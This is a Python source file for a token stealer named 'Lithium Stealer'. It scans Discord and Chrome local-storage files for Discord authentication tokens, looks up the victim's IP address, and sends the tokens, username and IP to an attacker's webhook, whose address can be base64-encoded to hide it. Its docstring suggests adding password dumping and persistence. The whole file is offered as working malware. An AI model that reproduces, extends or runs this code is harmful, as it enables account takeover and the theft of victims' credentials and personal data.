import os
import requests
import base64
import re
import threading


class stealer():
	'''
	Stealer Class:
		[Features]
			- Steals discord token from appdata
			- Checks chrome for tokens
			- Sends username, ip and found tokens through the webhook.

		[Suggestions]
			- Add more features such as:
				+ dump chrome passes
				+ dump more user info
				+ Multithread this so hunting is faster.
				+ Check tokens, in a way thats not going to get ratelimited
				+ Persistance if no tokens are found
	
	'''
	def __init__(self):
		self.googleTokens = []
		self.discordTokens = []
		self.userIp = "**Not Enabled**"
		self.regex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
		
	def sendData(self):
		"""
		Sends all our content via webhook, stable however you could make it not send data if no tokens are found. 
		A persistance module would always be nice for something like this.
		"""
		self.googleTokens = list(set(self.googleTokens))
		googleTokens = ""
		for i in self.googleTokens:
			googleTokens += f"```{i}```\n"

		self.discordTokens = list(set(self.discordTokens))
		discordTokens = ""
		for i in self.discordTokens:
			discordTokens+= f"```{i}```\n"

		data = {
		  "avatar_url":"https://i.imgur.com/c1CptAn.png",
		  
		  "embeds": [{
		    "title": "**Lithium Stealer Report:**",
		    "color": 1,
		    "thumbnail": {
		      "url": "https://i.imgur.com/c1CptAn.png"
		    },

		    "fields": [
		      {
		        "name": "**Tokens: **",
		        "value": f"**__Google__**: {googleTokens}\n**__Discord__**: {discordTokens}\n"
		      },
		      {
		        "name": "**User:**",
		        "value": f"Username: `{os.getlogin()}`\nIP: `{self.userData()}`"
		      }
		    ]
		  }
		  ]
		}
		try:
			if config["settings"][0]["base64"] == "true":
				requests.post(base64.b64decode(config["webhook"]).decode(),json=data)
			else:
				requests.post(config["webhook"],json=data)
		except:
			pass



	def chrome(self):
		"""
		Checks chrome for discord tokens, if a token is found it will append it to google tokens.
		"""
		chromie = os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb'
		try:
			for file in os.listdir(chromie):
				with open(f"{chromie}\\{file}", errors='ignore') as _data:
					regex = re.findall(self.regex, _data.read())
					if regex:
						for token in regex:
							self.googleTokens.append(token)
		except (FileNotFoundError, PermissionError):
			pass


	def discord(self):
		"""
		Checks discord for any tokens, if a token is found it will append it.
		"""
		discordPaths = [os.getenv('APPDATA') + '\\Discord\\Local Storage\\leveldb',
		os.getenv('APPDATA') + '\\discordcanary\\Local Storage\\leveldb',
		os.getenv('APPDATA') + '\\discordptb\\Local Storage\\leveldb']

		for location in discordPaths:
			try:
				for file in os.listdir(location):
					with open(f"{location}\\{file}", errors='ignore') as _data:
						regex = re.findall(self.regex, _data.read())
						if regex:
							for token in regex:
								self.discordTokens.append(token)
			except (FileNotFoundError, PermissionError):
				pass

	def userData(self):
		"""
		Checks for any found ip's
		"""
		try:
			self.ip = requests.get("https://api.ipify.org?format=json").json()
		except:
			pass
		return self.ip["ip"]


if __name__ == "__main__":
	s = stealer()
	if config["settings"][0]["discord"] == "true":
		s.discord()
	if config["settings"][0]["userData"] == "true":
		s.userData()
	if config["settings"][0]["chrome"] == "true":
		s.chrome()
	s.sendData()